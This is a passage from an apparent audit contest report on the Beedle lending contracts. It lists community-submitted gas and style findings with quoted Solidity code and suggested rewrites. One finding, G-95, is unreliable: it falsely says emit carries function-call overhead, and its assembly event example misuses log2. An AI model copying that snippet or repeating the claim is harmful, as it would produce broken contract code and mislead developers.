## Impact

## Tools Used

## Recommendations
## <a id='G-85'></a>G-85. improved/corrected comment: "a dynamic array of structs representing all desired debt positions to be refinanced."

_Submitted by [0xscsamurai](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L590

improved/corrected comment: "a dynamic array of structs representing all desired debt positions to be refinanced."
## <a id='G-86'></a>G-86. Using delete statement can save gas

_Submitted by [xfu](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [hunter_w3b](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined). Selected submission by: [hunter_w3b](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L56

## Summary

Using delete statement can save gas

## Vulnerability Details

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L56

```solidity
File: src/Staking.sol

56        claimable[msg.sender] = 0;

```

## <a id='G-87'></a>G-87. Use `assembly` to write address storage values

_Submitted by [xfu](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined). Selected submission by: [xfu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/utils/Ownable.sol#L15

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Fees.sol#L20

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/utils/Ownable.sol#L20

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Fees.sol#L21

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L74

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L101

## Summary

## Vulnerability Details
Where it does not affect readability,
using assembly for simple setters allows to save gas not only on deployment,
but also on function calls.

**There are `6` instances of this issue:**

- [owner = \_owner](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/utils/Ownable.sol#L15) should use `assembly` update address to save gas.

- [WETH = \_weth](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Fees.sol#L20) should use `assembly` update address to save gas.

- [owner = \_owner](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/utils/Ownable.sol#L20) should use `assembly` update address to save gas.

- [staking = \_staking](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Fees.sol#L21) should use `assembly` update address to save gas.

- [feeReceiver = msg.sender](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L74) should use `assembly` update address to save gas.

- [feeReceiver = \_feeReceiver](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L101) should use `assembly` update address to save gas.


## Impact

## Tools Used

## Recommendations
Using `assembly` update address to save gas.

For example:

```
contract Contract1 {
    address owner;

    function assemblyUpdateOwner(address newOwner) public {
        assembly {
            sstore(owner.slot, newOwner)
        }
    }
}
```
## <a id='G-88'></a>G-88. Use indexed events for value types as they are less costly compared to non-indexed ones

_Submitted by [xfu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L13

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L14-L17

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L18-L21

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L49

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L56

## Summary

## Vulnerability Details

Using the `indexed` keyword for [value types](https://docs.soliditylang.org/en/v0.8.21/types.html#value-types) (`bool/int/address/string/bytes`) saves gas costs, as seen in [this example](https://gist.github.com/0xxfu/c292a65ecb61cae6fd2090366ea0877e).

However, this is only the case for value types, whereas indexing [reference types](https://docs.soliditylang.org/en/v0.8.21/types.html#reference-types) (`array/struct`) are more expensive than their unindexed version.

**There are `5` instances of this issue:**

- The following variables should be indexed in [Lender.PoolBalanceUpdated(bytes32,uint256)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L13):

  - [newBalance](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L13)

- The following variables should be indexed in [Lender.PoolInterestRateUpdated(bytes32,uint256)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L14-L17):

  - [newInterestRate](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L16)

- The following variables should be indexed in [Lender.PoolMaxLoanRatioUpdated(bytes32,uint256)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L18-L21):

  - [newMaxLoanRatio](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L20)

- The following variables should be indexed in [Lender.LoanBought(uint256)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L49):

  - [loanId](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L49)

- The following variables should be indexed in [Lender.Refinanced(uint256)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L56):

  - [loanId](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L56)


## Impact

## Tools Used

## Recommendations
Using the `indexed` keyword for values types `bool/int/address/string/bytes` in event

## <a id='G-89'></a>G-89. Events are missing sender information

_Submitted by [xfu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L165

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L169

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L172

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L214

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L225

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L533

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L708

## Summary

## Vulnerability Details

When an action is triggered based on a user's action, not being able to filter based on
who triggered the action makes event processing a lot more cumbersome.
Including the `msg.sender` the events of these types of action will make events much more
useful to end users.

**There are `7` instances of this issue:**

- [PoolBalanceUpdated(poolId,p.poolBalance)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L165) should add `msg.sender` to event.

- [PoolCreated(poolId,p)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L169) should add `msg.sender` to event.

- [PoolUpdated(poolId,p)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L172) should add `msg.sender` to event.

- [PoolMaxLoanRatioUpdated(poolId,maxLoanRatio)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L214) should add `msg.sender` to event.

- [PoolInterestRateUpdated(poolId,interestRate)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L225) should add `msg.sender` to event.

- [LoanBought(loanId)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L533) should add `msg.sender` to event.

- [Refinanced(loanId)](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L708) should add `msg.sender` to event.


## Impact

## Tools Used

## Recommendations
Adding `msg.sender` to event.
## <a id='G-90'></a>G-90. Unnecessery function in the Beedle.sol contract

_Submitted by [iurii2002](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L29C1-L34C6

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L15C1-L20C6

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L22C1-L27C6

## Summary
Beedle token contract implements 4 functions apart from inherited function from `Ownable`, `ERC20`, `ERC20Permit`, `ERC20Votes`. These function are `_afterTokenTransfer`, `_mint`, `_burn` and `mint`. 
Only 'mint' function is needed and should be left in the contract. 

## Vulnerability Details
Functions `_afterTokenTransfer` and `_burn` are internal and can only be called internally within the contract or by the contracts inherited from the current one. They are not called inside of the contract and won't be reachable.

Function `_mint` is used in constructor, but as it simple calls the parent contract `super._mint(to, amount)` there is no particular reason to add it here.

## Impact
Additional gas is used for contract deployment that might be saved.

## Tools Used
Observation.

## Recommendations
Delete unnecessary functions
## <a id='G-91'></a>G-91. Use smaller data types for `lenderFee` and `borrowerFee` for better storage packing

_Submitted by [thekmj](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L62-L65

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L84-L95

## Summary

`lenderFee` and `borrowerFee` can be packed into smaller data types to save gas.

## Vulnerability Details

The current storage layout for `Lender.sol` is as follow:
```solidity
uint256 public lenderFee = 1000; // slot 1
uint256 public borrowerFee = 50; // slot 2
address public feeReceiver; // slot 3
```

All of these slots are initialized to non-zero during construction, incurring **21000 gas** each for using a Gsset operation (for **63000** gas in total).

Note that `lenderFee` and `borrowerFee` cannot exceed $5000$ and $500$, respectively. Therefore we can use smaller data types to pack all of those values into one slot.

```solidity
// all these takes a single slot
uint48 public lenderFee = 1000;
uint48 public borrowerFee = 50;
address public feeReceiver;
```

This converts two Gsset (21000 gas) into two Gsreset (2900 gas), for a total of **34200 gas** per lendings created.

## Impact

Saves **34200 gas** per lendings created.

## Tools Used

Manual review

## Recommendations

Use the recommended storage packing.
## <a id='G-92'></a>G-92. `_calculateInterest()` in `Lender.sol` can be refactored to save gas

_Submitted by [0xDetermination](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`_calculateInterest()` parameter(s) can be refactored to save gas
## Vulnerability Details
Because `_calculateInterest()` only accesses 3 properties of its `Loan` parameter, and the `Loan` struct contains 10 properties in total, it's more gas efficient to only pass those 3 accessed properties to `_calculateInterest`.
## Impact
Gas saved
## Tools Used

## Recommendations
Refactor `Lender.sol` so that `_calculateInterest` is only passed the 3 properties it needs, instead of an entire `Loan` struct.
## <a id='G-93'></a>G-93. Long functions should be refactored into multiple, smaller, functions

_Submitted by [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [SolSaver](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

## Summary
Long functions should be refactored into multiple, smaller, functions

## Vulnerability Details
```solidity
File: src/Lender.sol

232:     function borrow(Borrow[] calldata borrows) public {
             for (uint256 i = 0; i < borrows.length; i++) {
                 bytes32 poolId = borrows[i].poolId;
                 uint256 debt = borrows[i].debt;
                 uint256 collateral = borrows[i].collateral;
                 // get the pool info
                 Pool memory pool = pools[poolId];
                 // make sure the pool exists
                 if (pool.lender == address(0)) revert PoolConfig();
                 // validate the loan
                 if (debt < pool.minLoanSize) revert LoanTooSmall();
                 if (debt > pool.poolBalance) revert LoanTooLarge();
                 if (collateral == 0) revert ZeroCollateral();
                 // make sure the user isn't borrowing too much
                 uint256 loanRatio = (debt * 10 ** 18) / collateral;
                 if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();
                 // create the loan
                 Loan memory loan = Loan({
                     lender: pool.lender,
                     borrower: msg.sender,
                     loanToken: pool.loanToken,
                     collateralToken: pool.collateralToken,
                     debt: debt,
                     collateral: collateral,
                     interestRate: pool.interestRate,
                     startTimestamp: block.timestamp,
                     auctionStartTimestamp: type(uint256).max,
                     auctionLength: pool.auctionLength
                 });
                 // update the pool balance
                 _updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
                 pools[poolId].outstandingLoans += debt;
                 // calculate the fees
                 uint256 fees = (debt * borrowerFee) / 10000;
                 // transfer fees
                 IERC20(loan.loanToken).transfer(feeReceiver, fees);
                 // transfer the loan tokens from the pool to the borrower
                 IERC20(loan.loanToken).transfer(msg.sender, debt - fees);
                 // transfer the collateral tokens from the borrower to the contract
                 IERC20(loan.collateralToken).transferFrom(
                     msg.sender,
                     address(this),
                     collateral
                 );
                 loans.push(loan);
                 emit Borrowed(
                     msg.sender,
                     pool.lender,
                     loans.length - 1,
                     debt,
                     collateral,
                     pool.interestRate,
                     block.timestamp
                 );
             }
         }

292:     function repay(uint256[] calldata loanIds) public {
             for (uint256 i = 0; i < loanIds.length; i++) {
                 uint256 loanId = loanIds[i];
                 // get the loan info
                 Loan memory loan = loans[loanId];
                 // calculate the interest
                 (
                     uint256 lenderInterest,
                     uint256 protocolInterest
                 ) = _calculateInterest(loan);
     
                 bytes32 poolId = getPoolId(
                     loan.lender,
                     loan.loanToken,
                     loan.collateralToken
                 );
     
                 // update the pool balance
                 _updatePoolBalance(
                     poolId,
                     pools[poolId].poolBalance + loan.debt + lenderInterest
                 );
                 pools[poolId].outstandingLoans -= loan.debt;
     
                 // transfer the loan tokens from the borrower to the pool
                 IERC20(loan.loanToken).transferFrom(
                     msg.sender,
                     address(this),
                     loan.debt + lenderInterest
                 );
                 // transfer the protocol fee to the fee receiver
                 IERC20(loan.loanToken).transferFrom(
                     msg.sender,
                     feeReceiver,
                     protocolInterest
                 );
                 // transfer the collateral tokens from the contract to the borrower
                 IERC20(loan.collateralToken).transfer(
                     loan.borrower,
                     loan.collateral
                 );
                 emit Repaid(
                     msg.sender,
                     loan.lender,
                     loanId,
                     loan.debt,
                     loan.collateral,
                     loan.interestRate,
                     loan.startTimestamp
                 );
                 // delete the loan
                 delete loans[loanId];
             }
         }

355:     function giveLoan(
             uint256[] calldata loanIds,
             bytes32[] calldata poolIds
         ) external {
             for (uint256 i = 0; i < loanIds.length; i++) {
                 uint256 loanId = loanIds[i];
                 bytes32 poolId = poolIds[i];
                 // get the loan info
                 Loan memory loan = loans[loanId];
                 // validate the loan
                 if (msg.sender != loan.lender) revert Unauthorized();
                 // get the pool info
                 Pool memory pool = pools[poolId];
                 // validate the new loan
                 if (pool.loanToken != loan.loanToken) revert TokenMismatch();
                 if (pool.collateralToken != loan.collateralToken)
                     revert TokenMismatch();
                 // new interest rate cannot be higher than old interest rate
                 if (pool.interestRate > loan.interestRate) revert RateTooHigh();
                 // auction length cannot be shorter than old auction length
                 if (pool.auctionLength < loan.auctionLength) revert AuctionTooShort();
                 // calculate the interest
                 (
                     uint256 lenderInterest,
                     uint256 protocolInterest
                 ) = _calculateInterest(loan);
                 uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
                 if (pool.poolBalance < totalDebt) revert PoolTooSmall();
                 if (totalDebt < pool.minLoanSize) revert LoanTooSmall();
                 uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;
                 if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();
                 // update the pool balance of the new lender
                 _updatePoolBalance(poolId, pool.poolBalance - totalDebt);
                 pools[poolId].outstandingLoans += totalDebt;
     
                 // update the pool balance of the old lender
                 bytes32 oldPoolId = getPoolId(
                     loan.lender,
                     loan.loanToken,
                     loan.collateralToken
                 );
                 _updatePoolBalance(
                     oldPoolId,
                     pools[oldPoolId].poolBalance + loan.debt + lenderInterest
                 );
                 pools[oldPoolId].outstandingLoans -= loan.debt;
     
                 // transfer the protocol fee to the governance
                 IERC20(loan.loanToken).transfer(feeReceiver, protocolInterest);
     
                 emit Repaid(
                     loan.borrower,
                     loan.lender,
                     loanId,
                     loan.debt + lenderInterest + protocolInterest,
                     loan.collateral,
                     loan.interestRate,
                     loan.startTimestamp
                 );
     
                 // update the loan with the new info
                 loans[loanId].lender = pool.lender;
                 loans[loanId].interestRate = pool.interestRate;
                 loans[loanId].startTimestamp = block.timestamp;
                 loans[loanId].auctionStartTimestamp = type(uint256).max;
                 loans[loanId].debt = totalDebt;
     
                 emit Borrowed(
                     loan.borrower,
                     pool.lender,
                     loanId,
                     loans[loanId].debt,
                     loans[loanId].collateral,
                     pool.interestRate,
                     block.timestamp
                 );
             }
         }

465:     function buyLoan(uint256 loanId, bytes32 poolId) public {
             // get the loan info
             Loan memory loan = loans[loanId];
             // validate the loan
             if (loan.auctionStartTimestamp == type(uint256).max)
                 revert AuctionNotStarted();
             if (block.timestamp > loan.auctionStartTimestamp + loan.auctionLength)
                 revert AuctionEnded();
             // calculate the current interest rate
             uint256 timeElapsed = block.timestamp - loan.auctionStartTimestamp;
             uint256 currentAuctionRate = (MAX_INTEREST_RATE * timeElapsed) /
                 loan.auctionLength;
             // validate the rate
             if (pools[poolId].interestRate > currentAuctionRate) revert RateTooHigh();
             // calculate the interest
             (uint256 lenderInterest, uint256 protocolInterest) = _calculateInterest(
                 loan
             );
     
             // reject if the pool is not big enough
             uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
             if (pools[poolId].poolBalance < totalDebt) revert PoolTooSmall();
     
             // if they do have a big enough pool then transfer from their pool
             _updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt);
             pools[poolId].outstandingLoans += totalDebt;
     
             // now update the pool balance of the old lender
             bytes32 oldPoolId = getPoolId(
                 loan.lender,
                 loan.loanToken,
                 loan.collateralToken
             );
             _updatePoolBalance(
                 oldPoolId,
                 pools[oldPoolId].poolBalance + loan.debt + lenderInterest
             );
             pools[oldPoolId].outstandingLoans -= loan.debt;
     
             // transfer the protocol fee to the governance
             IERC20(loan.loanToken).transfer(feeReceiver, protocolInterest);
     
             emit Repaid(
                 loan.borrower,
                 loan.lender,
                 loanId,
                 loan.debt + lenderInterest + protocolInterest,
                 loan.collateral,
                 loan.interestRate,
                 loan.startTimestamp
             );
     
             // update the loan with the new info
             loans[loanId].lender = msg.sender;
             loans[loanId].interestRate = pools[poolId].interestRate;
             loans[loanId].startTimestamp = block.timestamp;
             loans[loanId].auctionStartTimestamp = type(uint256).max;
             loans[loanId].debt = totalDebt;
     
             emit Borrowed(
                 loan.borrower,
                 msg.sender,
                 loanId,
                 loans[loanId].debt,
                 loans[loanId].collateral,
                 pools[poolId].interestRate,
                 block.timestamp
             );
             emit LoanBought(loanId);
         }

591:     function refinance(Refinance[] calldata refinances) public {
             for (uint256 i = 0; i < refinances.length; i++) {
                 uint256 loanId = refinances[i].loanId;
                 bytes32 poolId = refinances[i].poolId;
                 bytes32 oldPoolId = keccak256(
                     abi.encode(
                         loans[loanId].lender,
                         loans[loanId].loanToken,
                         loans[loanId].collateralToken
                     )
                 );
                 uint256 debt = refinances[i].debt;
                 uint256 collateral = refinances[i].collateral;
     
                 // get the loan info
                 Loan memory loan = loans[loanId];
                 // validate the loan
                 if (msg.sender != loan.borrower) revert Unauthorized();
     
                 // get the pool info
                 Pool memory pool = pools[poolId];
                 // validate the new loan
                 if (pool.loanToken != loan.loanToken) revert TokenMismatch();
                 if (pool.collateralToken != loan.collateralToken)
                     revert TokenMismatch();
                 if (pool.poolBalance < debt) revert LoanTooLarge();
                 if (debt < pool.minLoanSize) revert LoanTooSmall();
                 uint256 loanRatio = (debt * 10 ** 18) / collateral;
                 if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();
     
                 // calculate the interest
                 (
                     uint256 lenderInterest,
                     uint256 protocolInterest
                 ) = _calculateInterest(loan);
                 uint256 debtToPay = loan.debt + lenderInterest + protocolInterest;
     
                 // update the old lenders pool
                 _updatePoolBalance(
                     oldPoolId,
                     pools[oldPoolId].poolBalance + loan.debt + lenderInterest
                 );
                 pools[oldPoolId].outstandingLoans -= loan.debt;
     
                 // now lets deduct our tokens from the new pool
                 _updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
                 pools[poolId].outstandingLoans += debt;
     
                 if (debtToPay > debt) {
                     // we owe more in debt so we need the borrower to give us more loan tokens
                     // transfer the loan tokens from the borrower to the contract
                     IERC20(loan.loanToken).transferFrom(
                         msg.sender,
                         address(this),
                         debtToPay - debt
                     );
                 } else if (debtToPay < debt) {
                     // we have excess loan tokens so we give some back to the borrower
                     // first we take our borrower fee
                     uint256 fee = (borrowerFee * (debt - debtToPay)) / 10000;
                     IERC20(loan.loanToken).transfer(feeReceiver, fee);
                     // transfer the loan tokens from the contract to the borrower
                     IERC20(loan.loanToken).transfer(msg.sender, debt - debtToPay - fee);
                 }
                 // transfer the protocol fee to governance
                 IERC20(loan.loanToken).transfer(feeReceiver, protocolInterest);
     
                 // update loan debt
                 loans[loanId].debt = debt;
                 // update loan collateral
                 if (collateral > loan.collateral) {
                     // transfer the collateral tokens from the borrower to the contract
                     IERC20(loan.collateralToken).transferFrom(
                         msg.sender,
                         address(this),
                         collateral - loan.collateral
                     );
                 } else if (collateral < loan.collateral) {
                     // transfer the collateral tokens from the contract to the borrower
                     IERC20(loan.collateralToken).transfer(
                         msg.sender,
                         loan.collateral - collateral
                     );
                 }
     
                 emit Repaid(
                     msg.sender,
                     loan.lender,
                     loanId,
                     debt,
                     collateral,
                     loan.interestRate,
                     loan.startTimestamp
                 );
     
                 loans[loanId].collateral = collateral;
                 // update loan interest rate
                 loans[loanId].interestRate = pool.interestRate;
                 // update loan start timestamp
                 loans[loanId].startTimestamp = block.timestamp;
                 // update loan auction start timestamp
                 loans[loanId].auctionStartTimestamp = type(uint256).max;
                 // update loan auction length
                 loans[loanId].auctionLength = pool.auctionLength;
                 // update loan lender
                 loans[loanId].lender = pool.lender;
                 // update pool balance
                 pools[poolId].poolBalance -= debt;
                 emit Borrowed(
                     msg.sender,
                     pool.lender,
                     loanId,
                     debt,
                     collateral,
                     pool.interestRate,
                     block.timestamp
                 );
                 emit Refinanced(loanId);
             }
         }
```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

## Tools Used
Manual Code Review by SolSaver

## Recommendations
Try to keep the functions smaller by breaking it down into smaller functions.

## <a id='G-94'></a>G-94. Interfaces should be indicated with an `I` prefix in the contract name

_Submitted by [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [SolSaver](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol

## Summary
Interfaces should be indicated with an `I` prefix in the contract name

## Vulnerability Details

```solidity
File: src/Staking.sol

7: interface FeeDistribution {

```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol

## Tools Used
Manual Code Review by SolSaver

## Recommendations
Consider adding the `I` prefix to the interfaces
## <a id='G-95'></a>G-95. Use assembly to emit an event

_Submitted by [Rolezn](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ziva](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L169

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L172

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L214

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L225

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L533

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L699

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L708

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L734

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L21

## Summary   Using assembly to emit an event instead of using Solidity's emit keyword can potentially save gas in certain scenarios. Let's explore how and when this gas optimization can be beneficial.
In Solidity, emitting an event using the emit keyword involves executing a function call to the EVM's event logging opcode. This incurs gas costs due to the overhead of the function call.
By using assembly, you can directly invoke the EVM's event logging opcode, bypassing the Solidity function call overhead. This can result in gas savings, especially when you need to emit events multiple times or in complex scenarios.
Here's an example of using assembly to emit an event:
contract MyContract {
    event MyEvent(uint256 value);

    function emitEventUsingAssembly(uint256 value) external {
        assembly {
            let eventPtr := mload(0x40)
            mstore(eventPtr, 32)                   // Length of the event data
            mstore(add(eventPtr, 0x20), value)     // Event data

            // Emit the event using the LOG2 opcode
            // LOG2(address, eventPtr, length)
            log2(0, eventPtr, 0x40)                // 0x40 is the size of the event data

            // Free memory
            mstore(0x40, add(eventPtr, 0x60))
        }
    }
}

In the above example, the emitEventUsingAssembly function uses assembly to directly invoke the LOG2 opcode to emit the event. The event data is loaded into memory, and the opcode is called with the appropriate parameters.
By using assembly, you eliminate the gas costs associated with the Solidity function call, resulting in potential gas savings.


## <a id='G-96'></a>G-96. Use do while loops instead of for loops.

_Submitted by [Rolezn](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xsandy](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L233

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L293

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L359

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L438

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L549

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L592

## Summary
You can use ``do while`` loops instead of ``for`` loops to save gas.

## Vulnerability Details
A ``do while`` loop will cost less gas since the condition is not being checked for the first iteration. Also, using do while loop with ++i is more gas efficient and wrapping ++i with unchecked keyword makes the whole iteration the most gas efficient of all. Also, the i is not initialized to 0 and the length of loop is cached. 

## Savings
There are six instances of for loops in the ``Lender.sol`` contract.
1. Savings for ``borrow()``:

| | Average  | Median | Max 
|------ |-----------|----------|----------|
|Before | 306602 | 364364 | 364364 
After| 306513 | 364265 | 364265 

2. Savings for ``seizeLoan()``:

| | Average  | Median | Max 
|------ |-----------|----------|----------|
|Before | 17001  | 2306   | 46392 
After| 16965  | 2284   | 46328

3. Savings for ``startAuction()``:

| | Average  | Median | Max 
|------ |-----------|----------|----------|
|Before | 5337   | 5733   | 5733  
After| 5246   | 5634   | 5634 

4. Savings for ``giveLoan()``:

| | Average  | Median | Max 
|------ |-----------|----------|----------|
|Before | 35436  | 35436  | 35436 
After| 35356  | 35356  | 35356

5. Savings for ``repay()``:

| | Average  | Median | Max 
|------ |-----------|----------|----------|
|Before | 22065  | 22065  | 22865 
After| 22001  | 22001  | 22801 

6. Savings for ``refinance()``:

| | Average  | Median | Max 
|------ |-----------|----------|----------|
|Before | 21076  | 21076  | 37164 
After| 21026  | 21026  | 37085  



## Tools Used
Manual Review and gas report via ``$ forge test --gas-report``

## Recommendations
1. For ``borrow()`` change from:

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232C2-L287C6

To:
```
/src/Lender.sol

function borrow(Borrow[] calldata borrows) public {
        uint256 i;
        uint256 length = borrows.length;
        do {
            bytes32 poolId = borrows[i].poolId;
            uint256 debt = borrows[i].debt;
            uint256 collateral = borrows[i].collateral;
            // get the pool info
            Pool memory pool = pools[poolId];
            // make sure the pool exists
            if (pool.lender == address(0)) revert PoolConfig();
            // validate the loan
            if (debt < pool.minLoanSize) revert LoanTooSmall();
            if (debt > pool.poolBalance) revert LoanTooLarge();
            if (collateral == 0) revert ZeroCollateral();
            // make sure the user isn't borrowing too much
            uint256 loanRatio = (debt * 10 ** 18) / collateral;
            if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();
            // create the loan
            Loan memory loan = Loan({
                lender: pool.lender,
                borrower: msg.sender,
                loanToken: pool.loanToken,
                collateralToken: pool.collateralToken,
                debt: debt,
                collateral: collateral,
                interestRate: pool.interestRate,
                startTimestamp: block.timestamp,
                auctionStartTimestamp: type(uint256).max,
                auctionLength: pool.auctionLength
            });
            // update the pool balance
            _updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
            pools[poolId].outstandingLoans += debt;
            // calculate the fees
            uint256 fees = (debt * borrowerFee) / 10000;
            // transfer fees
            IERC20(loan.loanToken).transfer(feeReceiver, fees);
            // transfer the loan tokens from the pool to the borrower
            IERC20(loan.loanToken).transfer(msg.sender, debt - fees);
            // transfer the collateral tokens from the borrower to the contract
            IERC20(loan.collateralToken).transferFrom(msg.sender, address(this), collateral);
            loans.push(loan);
            emit Borrowed(
                msg.sender, pool.lender, loans.length - 1, debt, collateral, pool.interestRate, block.timestamp
            );
            unchecked {
                ++i;
            }
        } while (i < length);
    }
```
2. For ``seizeLoan()`` change from:

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L548-L586

To:
```
/src/Lender.sol

function seizeLoan(uint256[] calldata loanIds) public {
        uint256 i;
        uint256 length = loanIds.length;
        do {
            uint256 loanId = loanIds[i];
            // get the loan info
            Loan memory loan = loans[loanId];
            // validate the loan
            if (loan.auctionStartTimestamp == type(uint256).max) {
                revert AuctionNotStarted();
            }
            if (block.timestamp < loan.auctionStartTimestamp + loan.auctionLength) revert AuctionNotEnded();
            // calculate the fee
